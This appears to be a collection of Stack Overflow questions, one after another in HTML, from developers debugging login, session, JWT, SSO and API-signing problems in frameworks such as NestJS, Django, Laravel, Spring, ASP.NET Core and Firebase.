<p>Currently we try to make the registering (already working, also, we using mysql for the database) work, as well as the login and logout functions. I'm using passport, passport-local and express-sessions for the authentication and for the session management. But I have and issue where I have been stuck for days now, and I can't really understand that.</p>
<p>When the backend is creating the session and serializing/deserializing the user, from where should the Angular front get the user data? From the cookie what is created? Or I should send the user data in JSON (like se sending everything else), and when the back get a HTTP request, IT should check if there is an authenticated user and sending back the data after that?</p>
<p>Also, if its the first (cookie) option or another which I didn't think, please tell me what should we be using.</p>
<p>When should be done with these already, so every help and information would be appreciated.</p>
<p>Also, if you need any source code, please tell me and I will provide it.</p>
"
"<p>My project is created in .NET framework 4.5. I want to validate <code>HttpContext</code> is not null on every http request.</p>
<p>I know two possibilities here:</p>
<ol>
<li>I have <code>Global.asax.cs</code> file, but in this file I can't access <code>HttpContext</code> object. Is there any way to do this?</li>
<li>Can I make custom authentication filter and use filter on methods called from <code>ProcessRequest()</code>.</li>
</ol>
<p>How to register custom filter in <code>Global.asax.cs</code> file?</p>
<p>For example:</p>
<pre><code>public void ProcessRequest(HttpContext context)
{
    _context = context;
    string requestEndPoint= context.Request[&quot;CBH&quot;];
    string response = &quot;&quot;;

    switch (requestEndPoint)
    {
        case &quot;GetData&quot;: 
            GetEmployeeData(); 
            break;
    }
}

[CustomFilter]    // This can be class to validate HttpContext or Session object.
public void GetEmployeeData()
{
    // some code ....
}
</code></pre>
"
"<p>I am trying to send email in windows server using laravel. Below is my email configuration.
The front end and backend application loaded in http and the firewall is enabled and disabled. But when i try to send email the message is saying as</p>
<blockquote>
<p>&quot;fwrite(): SSL: An existing connection was forcibly closed by the remote host&quot;.</p>
</blockquote>
<pre><code>MAIL_DRIVER=smtp
MAIL_HOST=outlook.office365.com
MAIL_PORT=587
MAIL_USERNAME=hr@testemail.com
MAIL_PASSWORD=xxxx
MAIL_ENCRYPTION=TLS
MAIL_FROM_ADDRESS=&quot;hr@testemail.com&quot;
MAIL_FROM_NAME=${APP_NAME}
</code></pre>
"
"<p>here's my study project codes. im trying to nestjs+jwt+passport.
however, no matter what method i use, i get a 401 Unauthorized error.
i cant even access the validate function, and when i try to console.log, it doesnt appear...
im sorry to ask you this question, and thanks for everybody's help</p>
<h1>auth.controller.ts</h1>
<pre class=""lang-js prettyprint-override""><code>import { Body, Controller, Get, Post, Req, UnauthorizedException, UseGuards } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { LoginDTO } from 'src/user/login.dto';
import { UserService } from 'src/user/user.service';
import { AuthGuard } from './auth.guard';

@Controller()
export class AuthController {
    constructor(
        private readonly userService: UserService,
        private readonly jwtService: JwtService
    ) {}

    @Post('/signin')
    async signin(@Body() loginDTO: LoginDTO) {
        const user = await this.userService.findByLogin(loginDTO);

        if (!user) {
            throw new UnauthorizedException('check again');
        }

        const accessToken = this.jwtService.sign({ email: loginDTO.email });

        return { accessToken: accessToken };
    }

    @UseGuards(AuthGuard)
    @Get('/test')
    async getProfile(@Req() req) {
        const user = req.user;
        return user;
    }
}
</code></pre>
<h1>auth.passport.jwt.ts</h1>
<pre class=""lang-js prettyprint-override""><code>import { Injectable, UnauthorizedException } from '@nestjs/common';
import { PassportStrategy } from '@nestjs/passport';
import { ExtractJwt, Strategy } from 'passport-jwt';
import { UserService } from 'src/user/user.service';

@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy, 'jwt') {
    constructor(private userService: UserService) {
        super({
            jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
            ignoreExpiration: true,
            secretOrKey: `${process.env.AUTH_SECRET_KEY}`
        });
    }

    async validate(payload: { email: string }) {
        const { email } = payload;
        const user = await this.userService.findByEmail(email);

        if (!user) {
            throw new UnauthorizedException({ message: 'null' });
        }

        return user;
    }
}
</code></pre>
<h1>auth.module.ts</h1>
<pre class=""lang-js prettyprint-override""><code>import { Module } from '@nestjs/common';
import { JwtModule } from '@nestjs/jwt';
import { AuthController } from './auth.controller';
import { UserModule } from 'src/user/user.module';
import { PassportModule } from '@nestjs/passport';
import { JwtStrategy } from './auth.passport.jwt';

@Module({
    imports: [
        JwtModule.register({
            secret: `${process.env.AUTH_SECRET_KEY}`
        }),
        UserModule,
        PassportModule
    ],
    controllers: [AuthController],
    providers: [JwtStrategy]
})
export class AuthModule {}

</code></pre>
<h1>auth.guard.ts</h1>
<pre class=""lang-js prettyprint-override""><code>import { ExecutionContext, Injectable } from '@nestjs/common';
import { AuthGuard as NestAuthGuard } from '@nestjs/passport';

@Injectable()
export class AuthGuard extends NestAuthGuard('jwt') {
    canActivate(context: ExecutionContext) {
        return super.canActivate(context);
    }
}
</code></pre>
<p>I've tried using AuthGuard() from @nestjs/passport instead of AuthGuard in the controller's @UseGuards(AuthGuard) section, but the same error occurs.</p>
"
"<p>I am using enterprise environment and no installations are allowed.
What I need is to create some kind of script to do several things:</p>
<ol>
<li>Open an Internet Explorer website (with this browser).</li>
<li>Website window must be clicked to activate it and navigate using TAB key at least 20 times to get a new link which opens a new window (java) to enter values.</li>
<li>Those values are &quot;user&quot; and &quot;password&quot;, I can navigate between fields using TAB. So I need to enter a string (or keypress simulation to enter a word) for USER, pres TAB, enter another string for PASSWORD, press TAB twice and then ENTER.</li>
</ol>
<p>Is it possible?</p>
<p>I tried batch scripts, &quot;autohotkey&quot; and &quot;PhraseExpress&quot; stuff with no results.</p>
"
"<p>I´m on a Mac Ventura 13.6 and laravel (8.12) is set up with herd, using php 8.0. I can see the database table in phpmyadmin. I enter the credentials in the login of the program under knob.test and it tells me: Whoops! Something went wrong. These credentials do not match our records.</p>
<p>How can I approach this to debug it? I have the debug bar installed.</p>
<p>I have been at this problem for over a month now (I am a novice and haven´t asked any questions so far, I was trying to use chatgpt to solve everything but I am hitting a brick wall here). I have tried too many things to list them all here, and since I am a beginner, I don´t know if these things are relevant.</p>
"
"<p>I want to fetch sign-in and sign-out time from clerk. If there is anyone who knows how to do it or if there is any functions do let me know.</p>
<pre><code>const Timesheet = () =&gt; {
  const [activeTab, setActiveTab] = useState(&quot;Time Sheet&quot;);
  const clerk = useClerk();
  const [signInTime, setSignInTime] = useState(null);
  const [signOutTime, setSignOutTime] = useState(null);

  useEffect(() =&gt; {
    const fetchUserSignInSignOutTime = async () =&gt; {
      const userSignInSignOutData = await fetchSignInSignOutTimeFromServer(clerk.user.id);
      setSignInTime(userSignInSignOutData.signIn);
      setSignOutTime(userSignInSignOutData.signOut);
    };

    fetchUserSignInSignOutTime();
  }, [clerk.user.id]);
</code></pre>
<p>i tried this way but it says look for actual function from clerk</p>
"
"<p>I have setup an Azure Ad Account, Having Client Id, Tenant Id , Able to Login With Clint Id For a Added Account (In A Tenant )  From My React Native App. Now I am looking for options to implement Biometric Authentication.</p>
<p>Please Let me know if there is any resource or information is available for the same.</p>
<p>I have just looked for Configure Transmit Security with Azure Active Directory B2C for password less authentication.</p>
<p>Looking for more to understand the flow.</p>
"
"<p>So, i tried the Vaadin login component as in the tutorial <a href=""https://vaadin.com/docs/latest/security/enabling-security"" rel=""nofollow noreferrer"">https://vaadin.com/docs/latest/security/enabling-security</a> and it works like a charm.</p>
<p>Now I'm trying to customize the login form but whenever I log in, I get logged out when i try to navigate to any other pages. Please help.</p>
<p>Login Form:</p>
<pre><code>        @Route(&quot;login&quot;)
        @PageTitle(&quot;Login&quot;)
        @AnonymousAllowed
        
        public class LoginViewOverLay extends Div implements BeforeEnterObserver, ComponentEventListener&lt;AbstractLogin.LoginEvent&gt; {
       
            
            @Autowired
            private AuthenticationManager authenticationManager;
            @Autowired
            SecurityService securityservice;
            @Autowired UserDetailsServiceImpl userdetails;
            FormLayout form = new FormLayout();
            LoginOverlay loginOverlay = new LoginOverlay();
            public LoginViewOverLay() {
                add(loginOverlay);
                loginOverlay.setOpened(true);
                loginOverlay.addLoginListener(this);
            }
            
            @Override
            public void onComponentEvent(AbstractLogin.LoginEvent loginEvent) {

                try {
                    securityservice.authenticateUser(loginEvent.getUsername(), loginEvent.getPassword());
                    loginOverlay.close();
                    getUI().ifPresent(ui -&gt; ui.navigate(&quot;/&quot;));
                    
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
        
            @Override
            public void beforeEnter(BeforeEnterEvent beforeEnterEvent) {
                if(beforeEnterEvent.getLocation()
                    .getQueryParameters()
                    .getParameters()
                    .containsKey(&quot;error&quot;)) {
                    loginOverlay.setError(true);
                }
            }
          
        }
</code></pre>
<p>My Security service class:</p>
<pre><code>@Component
public class SecurityService {
    @Autowired
    UserDetailsServiceImpl userdetails;
    @Autowired
    PasswordEncoder encoder;
    private final AuthenticationContext authenticationContext;

    public SecurityService(AuthenticationContext authenticationContext) {
        this.authenticationContext = authenticationContext;
    }

    public UserDetails getAuthenticatedUser() {
        return authenticationContext.getAuthenticatedUser(UserDetails.class).get();
    }

    public void logout() {
        authenticationContext.logout();
    }
    public UserDetails getAuthenticatedUser2() {
        SecurityContext context = SecurityContextHolder.getContext();
        Object principal = context.getAuthentication().getPrincipal();
        if (principal instanceof UserDetails) {
            return (UserDetails) context.getAuthentication().getPrincipal();
        }
        // Anonymous or no authentication.
        return null;
    }
    
    public void authenticateUser(UserDetails userDetails) {
        Authentication authentication = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
        SecurityContextHolder.getContext().setAuthentication(authentication);
    }
    public void authenticateUser(String username, String password) {
        UserDetails userDetails = userdetails.loadUserByUsername(username);
        if (encoder.matches(password, userDetails.getPassword())) {
            Authentication authentication = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
            SecurityContextHolder.getContext().setAuthentication(authentication);
          
        } else {
           // System.out.println(&quot;wrong&quot;);
        }
    }
}
</code></pre>
<p>My User Details Class:</p>
<pre><code>@Service
public class UserDetailsServiceImpl implements UserDetailsService {
    private final UserRepository userRepository;
    
    public UserDetailsServiceImpl(UserRepository userRepository) {
        this.userRepository = userRepository;
    }

    @Override
    @Transactional
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        UserLogin user = userRepository.findByUserNameAndEnabled(username, true);
        if (user == null) {
            throw new UsernameNotFoundException(&quot;No user present with username: &quot; + username);
        } else {
            //System.out.println(&quot;Yes User&quot;);
            return new User(user.getUserName(), user.getHashedPassword(), getAuthorities(user));
            
        }

    }

    private static List&lt;GrantedAuthority&gt; getAuthorities(UserLogin user) {
       return user.getRoles().stream().map(role -&gt; new SimpleGrantedAuthority(&quot;ROLE_&quot; + role.getRoleName()))
                .collect(Collectors.toList());
      

    }
    
}
</code></pre>
<p>Security Configuration class:</p>
<pre><code>@EnableWebSecurity
@Configuration
public class SecurityConfiguration extends VaadinWebSecurity {

    @Autowired
    UserDetailsServiceImpl userdetails;
    
    @Bean
    PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    AuthenticationManager authenticationManager(AuthenticationConfiguration authenticationConfiguration) throws Exception {
        return authenticationConfiguration.getAuthenticationManager();
    }
    

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.authorizeHttpRequests(authorize -&gt; authorize
                .requestMatchers(AntPathRequestMatcher.antMatcher(HttpMethod.GET, &quot;/images/*.png&quot;)).permitAll()
                // .requestMatchers(new AntPathRequestMatcher(&quot;/**&quot;,
                // HttpMethod.POST.toString())).permitAll()
                .requestMatchers(new AntPathRequestMatcher(&quot;/**&quot;, HttpMethod.DELETE.toString())).denyAll()
                .requestMatchers(new AntPathRequestMatcher(&quot;/**&quot;, HttpMethod.OPTIONS.toString())).denyAll()
                .requestMatchers(AntPathRequestMatcher.antMatcher(HttpMethod.OPTIONS, &quot;/**&quot;)).denyAll()
                
        ).sessionManagement(session -&gt; session

                        .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED).invalidSessionUrl(&quot;/&quot;)
                        .maximumSessions(1).sessionRegistry(sessionRegistry()).expiredUrl(&quot;/&quot;)
                        .maxSessionsPreventsLogin(false));

        super.configure(http);
    setLoginView(http, LoginViewOverLay.class);
    
    }
    
    @Bean
    SessionRegistry sessionRegistry() {
        return new SessionRegistryImpl();
    }
    

}
</code></pre>
"
"<p>I'm trying to connect my MySql RDS instance to my Heroku environment securely, but I can't whitelist my ENV's ip address because (as I understand it) Heroku changes the ip address' at random.</p>
<p>Using the config vars with the DB credentials and connecting them with an ip of 0.0.0.0 in the security group works, but isn't a best practice security wise. What alternatives are available to me?</p>
<p>I've toyed with the idea of adding an ssl cert to my codebase, but this also doesn't seem like a very good idea.</p>
"
"<p>I have been following <a href=""https://www.develou.com/crear-un-webservice-para-android-con-mysql-php-y-json/"" rel=""nofollow noreferrer"">this</a> tutorial (in Spanish) to query a MySQL database from Android. The tutorial uses PHP web services (PDO). So far, queries are working, but I am using &quot;root&quot; user.</p>
<p>The app should allow users to make queries without login, but instead of using &quot;root&quot;, I created &quot;guest&quot; user in the database to make these queries.</p>
<p>To insert, edit or deleted data, the users will need to login. For this, I created &quot;admin&quot; user. Of course, once the user is logged in as &quot;admin&quot;, also can query the database with this user.</p>
<p>My problem is that this tutorial uses &quot;root&quot; for all operations.</p>
<p><strong>mysql_login.php:</strong></p>
<pre><code>&lt;?php
/**
 * Provee las constantes para conectarse a la base de datos
 * Mysql.
 */
define(&quot;HOSTNAME&quot;, &quot;localhost&quot;);// Nombre del host
define(&quot;DATABASE&quot;, &quot;i_wish&quot;); // Nombre de la base de datos
define(&quot;USERNAME&quot;, &quot;root&quot;); // Nombre del usuario
define(&quot;PASSWORD&quot;, &quot;&quot;); // Nombre de la constraseña
?&gt;
</code></pre>
<p><strong>Database.php:</strong></p>
<pre><code>&lt;?php
/**
 * Clase que envuelve una instancia de la clase PDO
 * para el manejo de la base de datos
 */

require_once 'mysql_login.php';


class Database
{

    /**
     * Única instancia de la clase
     */
    private static $db = null;

    /**
     * Instancia de PDO
     */
    private static $pdo;

    final private function __construct()
    {
        try {
            // Crear nueva conexión PDO
            self::getDb();
        } catch (PDOException $e) {
            // Manejo de excepciones
        }


    }

    /**
     * Retorna en la única instancia de la clase
     * @return Database|null
     */
    public static function getInstance()
    {
        if (self::$db === null) {
            self::$db = new self();
        }
        return self::$db;
    }

    /**
     * Crear una nueva conexión PDO basada
     * en los datos de conexión
     * @return PDO Objeto PDO
     */
    public function getDb()
    {
        if (self::$pdo == null) {
            self::$pdo = new PDO(
                'mysql:dbname=' . DATABASE .
                ';host=' . HOSTNAME .
                ';port:63343;',
                USERNAME,
                PASSWORD,
                array(PDO::MYSQL_ATTR_INIT_COMMAND =&gt; &quot;SET NAMES utf8&quot;)
            );

            // Habilitar excepciones
            self::$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        }

        return self::$pdo;
    }

    /**
     * Evita la clonación del objeto
     */
    final protected function __clone()
    {
    }

    function _destructor()
    {
        self::$pdo = null;
    }
}

?&gt;
</code></pre>
<p>I have found samples to have a login screen and validate the username and password such as: <a href=""https://phpdelusions.net/pdo_examples/connect_to_mysql"" rel=""nofollow noreferrer"">this</a> or <a href=""https://justsimpleinfo.blogspot.com/2018/06/android-simple-login-with-php-and-mysql.html"" rel=""nofollow noreferrer"">this</a>.</p>
<p>However, what is not clear to me is what to do next. Once the user is validated, how do I make CRUD operations with my user? I am struggling to find a sample.</p>
<p>If I am not wrong, I think &quot;mysql_login.php&quot; should include the &quot;guest&quot; credentials, and not the &quot;root&quot; ones. Then, when the user tries to login from the app, I would have to query the database to validate the username and password. To do this, I should use &quot;root&quot;, but how?</p>
<p>Do I need a second &quot;Database.php&quot; and &quot;mysql_login.php&quot; with &quot;root&quot; credentials? Because the first &quot;Database.php&quot; would contain &quot;require_once 'mysql_login.php';&quot; with &quot;guest&quot; credentials. Or is it possible to send these credentials from the app to the web service somehow? Like a parameter?</p>
<p>Second problem is that if user logins in successfully, then any CRUD query should be done with &quot;admin&quot; user. Not &quot;guest&quot;, not &quot;root&quot;. How to achieve this?</p>
<p>I guess that if it is possible to send the credentials via parameters for my first problem, then the solution to the second problem would be the same.</p>
<p>Thank you!</p>
"
"<p>I right now have an Entra/Azure AD App registration that is being used by a small Angular SPA to authenticate it to an ASP.NET Core Web API.</p>
<p>When I decode the JWT, the <code>iss</code> (issuer) is:</p>
<pre><code> &quot;iss&quot;: &quot;https://sts.windows.net/64..............a21/&quot;,
</code></pre>
<p>and in my <code>Program.cs</code>, I have:</p>
<pre><code>builder.Services.AddAuthentication(options =&gt;
    {
    options.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;
    options.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;
    options.DefaultScheme = JwtBearerDefaults.AuthenticationScheme;
}).AddJwtBearer(o =&gt;
{
    o.TokenValidationParameters = new TokenValidationParameters
    {
        ValidIssuer = builder.Configuration[&quot;https://login.microsoftonline.com/64..............a21&quot;],
        ValidAudience = builder.Configuration[&quot;http://localhost:5036/&quot;],
        IssuerSigningKey = new SymmetricSecurityKey
        (Encoding.UTF8.GetBytes(builder.Configuration[&quot;?????&quot;])), //this is what i feel like I am missing
        ValidateIssuer = true,
        ValidateAudience = true,
        ValidateLifetime = false,
        ValidateIssuerSigningKey = true
    };
});
</code></pre>
<p>I am getting http error 401's when running my Angular app in local dev mode and the API locally too. I was following this <a href=""https://learn.microsoft.com/en-us/entra/identity-platform/quickstart-register-app"" rel=""nofollow noreferrer"">guide</a> to make the app registration.</p>
<p>So my question is - how can I get the signing key so that my app can validate JWT tokens from Azure.</p>
"
"<p>I'm using Databricks to send some data to Kafka:</p>
<pre><code>(df.write
  .format('kafka')
  .option('kafka.bootstrap.servers', 'glider.srvs.cloudkafka.com:9094')
  .option('kafka.security.protocol', 'SASL_SSL')
  .option('kafka.sasl.mechanism', 'SCRAM-SHA-512')
  .option(&quot;kafka.sasl.jaas.config&quot;, &quot;kafkashaded.org.apache.kafka.common.security.scram.ScramLoginModule required username='my_username' password='my_password';&quot;)
  .option('topic', '&lt;my_topic&gt;')
  .save())
</code></pre>
<p>but it fails with message:</p>
<pre><code>An error occurred while calling o2296.save.
: org.apache.spark.SparkException: Job aborted due to stage failure: Task 3 in stage 31.0 failed 1 times, most recent failure: Lost task 3.0 in stage 31.0 (TID 251) (ip-10-172-216-86.us-west-2.compute.internal executor driver): kafkashaded.org.apache.kafka.common.KafkaException: Cannot execute transactional method because we are in an error state
...
Caused by: [CIRCULAR REFERENCE: kafkashaded.org.apache.kafka.common.errors.ClusterAuthorizationException: Cluster authorization failed.]
</code></pre>
<p>Credentials and security protocols are 100% correct as it works fine if I send data using Python's &quot;confluent_kafka&quot; library.</p>
<p>Any idea what's wrong with here? Maybe some option(s) must be adjusted?</p>
<p>I tried to specify different module</p>
<pre><code>  .option(&quot;kafka.sasl.jaas.config&quot;, &quot;kafkashaded.org.apache.kafka.common.security.plain.PlainLoginModule required username='my_username' password='my_password';&quot;)
</code></pre>
<p>but the result was the same.</p>
"
"<p>I am a new comer in Django field. I have an existing Django application with independent login implemented. The task is to integrate Azure AD Single Sign On using SAML protocol. The flow is user request for application url, it will redirect to the Azure portal, Signed in using federated credential automatically and redirect to the requested url or a specific app url after authorize. I am using djangosaml2 librery.</p>
<p>I am able to redirect to the Azure portal but while authenticating I am getting &quot;csrf verification failed&quot; error. Basically I have zero knowledge about how django authentication works and how to integrate the response from azure in django. Any one please help me out with a through walkthrough of the SSO authentication process with SAML. How to get the attributes from SAML and how to authenticate and authorize. My current project structure is given below.
my-project
templates
app1
login
home
proj
settings.py
remote_xml_metadata.xml
urls.py
views.py
app1
urls.py
views.py</p>
"
"<h3>Hey everyone,</h3>
<p>I'm currently working on a nextJS project and have to access the <code>user.sub</code> inside the api. I was thinking of getting the access token inside of the api and decodiding it to access the <code>user.sub</code>, but when I call getAccessToken with req and res I get a token that looks like this:</p>
<pre><code>eySomeInfoHere..someencodeHere
</code></pre>
<p>With the content between the dots being empty. See the shortened version below (I removed a couple chars)</p>
<pre><code>eyJhbGciOiJkIn0..I0WiieOi0yubQJth.5pMGqaX4npcIkoAYHTxfoi7_niLo-RhxR5rHE0vJmjR7ZxRrSYWoBn3yKId1wFsf4LxdDXC9NuUz8xxBAYRSLoKgq2BZSv_xNRZ8LbWVRvcUl9EBj8BsrjbO5far9WEkgfBARbWdIOKMltrC2WDZVZ4peTWg
</code></pre>
<br>
<br>
<p>My nextjs Frontend only sends a session Cookie with each request, I haven't changed much from the standart server side configuration here, where you don't really ever get access to the auth token client side.</p>
<p>Other than that here is the structure of my code:
Frontend:</p>
<pre><code>const SomeComponent = withPageAuthRequired(() =&gt; {
  callEndpoint()
  return &lt;div&gt;&lt;/div&gt;
});

async function callEndpoint() =&gt; {
  const response = await fetch(&quot;/route&quot;, {
    method: &quot;POST&quot;,
    body: JSON.stringify({}),
  }
  ...
  return await response.json()
}

</code></pre>
<p>This hits the backend function (This one has all the logic in it, database calls are omitted on purpose):</p>
<pre><code>import { Subscription } from &quot;@/src/types/configurationTypes&quot;;
import { getAccessToken, withApiAuthRequired } from &quot;@auth0/nextjs-auth0&quot;;
import { PrismaClient } from &quot;@prisma/client&quot;;
import { NextRequest, NextResponse } from &quot;next/server&quot;;
import { isValidURLwithHTTPS } from &quot;../../utils/validation&quot;;

const prisma = new PrismaClient();

const POST = withApiAuthRequired(async (req: NextRequest) =&gt; {
  const res = new NextResponse();
  try {
    const body: {
      name: string;
      cleartextName: string;
      socialUrls: string[];
      subscription: Subscription;
    } = await req.json();
    let isAllSocialUrlsValid = true;
    if (Array.isArray(body?.socialUrls)) {
      body?.socialUrls.forEach((link: string) =&gt; {
        try {
          if (!isValidURLwithHTTPS(link)) {
            isAllSocialUrlsValid = false;
          }
        } catch (err: any) {
          isAllSocialUrlsValid = false;
        }
      });
    } else {
      isAllSocialUrlsValid = false;
    }

    if (
      typeof body?.name === &quot;string&quot; &amp;&amp;
      isAllSocialUrlsValid &amp;&amp;
      body.socialUrls.length !== 0 &amp;&amp;
      typeof body?.cleartextName === &quot;string&quot; &amp;&amp;
      typeof body?.subscription === &quot;string&quot;
    ) {
      const createLabel = prisma.label.create({
        data: {
          name: body.name,
          cleartextName: body.cleartextName,
          subscription: body.subscription,
          socialUrls: body.socialUrls,
        },
      });

      // SEE HERE
      const { accessToken } = await getAccessToken(req, res, {
        authorizationParams: {
          audience: &quot;myaudiencenameishere.eu.auth0.com&quot;,
          scope: &quot;openid profile email&quot;,
        },
      });
      console.log(accessToken);


      /*const createLabelXUser = prisma.labelXUser.create({
        data: {
          labelName: body.name,
          userId: ,
          role: &quot;ADMIN&quot;,
        }
      })*/
      return NextResponse.json(&quot;dbLabel&quot;, { status: 200 });
    }
    return NextResponse.json(
      { error: &quot;Bad Request, your input failed to validate&quot; },
      { status: 400 }
    );
  } catch (e: any) {
    return NextResponse.json(
      { error: &quot;There hast been an Error!&quot;, message: e.message },
      { status: 500 }
    );
  }
});

export { POST };
</code></pre>
<p>Thanks in advance for any guidance on this, I might have missed some needed configuration but unfortunatly didn't find any answers to what I'm doing wrong so far...</p>
"
"<p>I have a code similar to this:</p>
<pre><code>new KeyVaultClient(new TokenCredentials(myBearerToken));
</code></pre>
<p>But, I'm migrating from AppAuthentication to Azure.Identity, so I have followed this guide: <a href=""https://learn.microsoft.com/en-us/dotnet/api/overview/azure/app-auth-migration?view=azure-dotnet"" rel=""nofollow noreferrer"">https://learn.microsoft.com/en-us/dotnet/api/overview/azure/app-auth-migration?view=azure-dotnet</a>. The main problem is that I can not find a way to use Bearer Token, I have tried this:</p>
<pre><code>new SecretClient(new Uri(keyVaultURI), new ClientSecretCredential(tenantId, clientId, myBearerToken));
</code></pre>
<p>Is there any way to accomplish this migration with a Bearer Token?</p>
"
"<p>I'm trying to fetch my Kucoin spot trading balance using their REST API, but I'm encountering a 401 error with the message 'Invalid KC-API-SIGN'. Here's my Python code and the steps I've taken from <a href=""https://www.kucoin.com/docs/basic-info/connection-method/authentication/signing-a-message"" rel=""nofollow noreferrer"">Kucoin Docs API</a>:</p>
<pre><code>import hmac
import hashlib
import base64
import requests

api_key = 'YOUR_API_KEY'
api_secret = 'YOUR_API_SECRET'
api_passphrase = 'YOUR_API_PASSPHRASE'

url = 'https://api.kucoin.com/api/v1/accounts'
now = str(int(time.time() * 1000))
str_to_sign = now + 'GET' + '/api/v1/accounts'
signature = hmac.new(api_secret.encode('utf-8'), str_to_sign.encode('utf-8'), hashlib.sha256).hexdigest()

passphrase = base64.b64encode(hmac.new(api_secret.encode('utf-8'), api_passphrase.encode('utf-8'), hashlib.sha256).digest())
headers = {
    &quot;KC-API-SIGN&quot;: signature,
    &quot;KC-API-TIMESTAMP&quot;: now,
    &quot;KC-API-KEY&quot;: api_key,
    &quot;KC-API-PASSPHRASE&quot;: passphrase,
    &quot;KC-API-KEY-VERSION&quot;: &quot;2&quot;
}
response = requests.request('get', url, headers=headers)
print(response.status_code)
print(response.json())
</code></pre>
<p>Double-checked API credentials:- I've meticulously verified my API key, secret, and passphrase.
Reviewed timestamp generation:-  I've ensured that the timestamp is in the correct format (milliseconds since Unix epoch).
Examined Kucoin documentation:-  I've carefully studied Kucoin's API docs for potential errors in my signature generation process.</p>
"
"<p>I built a registration form + view + template, but when I try to register, the user is not being saved to the database, neither does it log me in.</p>
<p>I expected my form to register my user and save it to the database.
This is my code</p>
<p>(Register form)</p>
<pre><code>from django import forms
from django.contrib.auth.forms import UserCreationForm
from django.contrib.auth.models import User

class UserRegistrationForm(forms.ModelForm):
    email = forms.EmailField()
    password = forms.CharField(label='Password', widget=forms.PasswordInput)
    password2 = forms.CharField(label='Confirm password', widget=forms.PasswordInput)

    class Meta:
        model = User
        fields = ['username', 'email']

    def check_password(self):
        if self.cleaned_data['password'] != self.cleaned_data['password2']:
            raise forms.ValidationError('Passwords do not match!')
        return self.cleaned_data['password2']
</code></pre>
<p>(Register view)</p>
<pre><code>def register_view(request):
    if request.method == 'POST':
        register_form = UserRegistrationForm(request.POST)
        if register_form.is_valid():
            user = register_form.save(commit=False)
            user.set_password = register_form.cleaned_data['password']
            # Automatically log in the user after registration
            username = register_form.cleaned_data['username']
            password = register_form.cleaned_data['password']
            user = authenticate(request, username=username, password=password)
            if user is not None:
                login(request, user)
                # Redirect to a success page or home page
                return redirect('home1:index')  # Adjust 'home' to your home page URL name
    else:
        register_form = UserRegistrationForm()
    return render(request, 'register.html', {'register_form': register_form})
</code></pre>
<p>(Register Template)</p>
<pre><code>&lt;form class=&quot;form&quot; method=&quot;post&quot;&gt;
    {% csrf_token %}
    &lt;label class=&quot;label&quot; for=&quot;email&quot;&gt;Email:&lt;/label&gt;
    &lt;input class=&quot;input&quot; type=&quot;text&quot; id=&quot;email&quot; name=&quot;email&quot;&gt;
    &lt;label class=&quot;label&quot; for=&quot;username&quot;&gt;Username:&lt;/label&gt;
    &lt;input class=&quot;input&quot; type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt;
    &lt;label class=&quot;label&quot; for=&quot;password&quot;&gt;Password:&lt;/label&gt;
    &lt;input class=&quot;input&quot; type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot;&gt;
    &lt;label class=&quot;label&quot; for=&quot;confirm_password&quot;&gt;Confirm Password:&lt;/label&gt;
    &lt;input class=&quot;input&quot; type=&quot;password&quot; id=&quot;confirm_password&quot; name=&quot;password1&quot;&gt;
    &lt;button class=&quot;button&quot; type=&quot;submit&quot;&gt;Register&lt;/button&gt;
&lt;/form&gt;
</code></pre>
"
"<p>I have security.php:</p>
<pre><code>&lt;?php
session_start();
if (!isset($_SESSION['logged']) || !$_SESSION['logged'] ) {
    header(&quot;location:/backoffice/login.php&quot;);
    session_destroy();
} 
</code></pre>
<p>And my controller usersControll.php:</p>
<pre><code>&lt;?php
include &quot;security.php&quot;;
include &quot;users.php&quot;; //model 

$option = filter_input(INPUT_POST, 'option', FILTER_SANITIZE_NUMBER_INT);

switch ($option) {
    cases...
    case 9:
        $user = filter_input(INPUT_POST, 'user', FILTER_SANITIZE_STRING);
        $passwd = filter_input(INPUT_POST, 'passwd', FILTER_SANITIZE_STRING);
        logInLogOut::logIn($user, $passwd);
        break;
    case 10:
        logInLogOut::logOut();
        break;
    More cases...
}


</code></pre>
<p>The problem is when I log in, it enters inside the switch (controller) ignoring security.php. It shouldn't go in because $_SESSION['logged'] isn't set. I send the logIn data to the controller from a form and it send the switch option (9) through the form too with a hidden input.</p>
<p>I expect to not enter in the switch and it enters in all time, i tried switching session values and conditions but didnt work</p>
"
"<p>In my spring application, I have implemented spring security and cookie based authentication using spring session management whith redis server for storing sessions.</p>
<p>In my application after login the custom sessionToken is generated.</p>
<p>So, User1 has one sessionToken and User2 has different sessionToken.</p>
<p>Using cookie-editor plugin, if I copied User1 sessionToken and applied in User2 profile page, User2 changed to User1 profile which leads to security vulnerabilities.
<a href=""https://i.stack.imgur.com/hbAWB.png"" rel=""nofollow noreferrer"">pic of cookie-editor plugin</a></p>
<p>If a basic user tries to use an admin user's session token, it should trigger a security mechanism to invalidate the session and log out the user.
in my case it is the profile is changing.</p>
<p>for my configure method in security config class i gaeve</p>
<p>@Override
protected void configure(HttpSecurity http) throws Exception {</p>
<pre><code>    // Other Configurations

    //        configuring session management
    http.sessionManagement()
            .sessionCreationPolicy(SessionCreationPolicy.STATELESS);

}
</code></pre>
<p>I want if User1 sessionToken is copied and applied to User2 profile using cookie editor it should be logged out instead if changing.</p>
<p>Do i have to change in front end(Java script, jquery)?
or spring configuration side?</p>
"
"<p>i am trying to add authentication using firebase google provider, but after authentication iam getting the firebase token in which the email is null, other things such as name, photourl is present.</p>
<p>i tried to add the scopes to the provider function but its not working</p>
<pre><code>  const handleGoogleLogin = async () =&gt; {
    const googleProvider = new GoogleAuthProvider();
    googleProvider.setCustomParameters({
      prompt: &quot;select_account&quot;,
    });
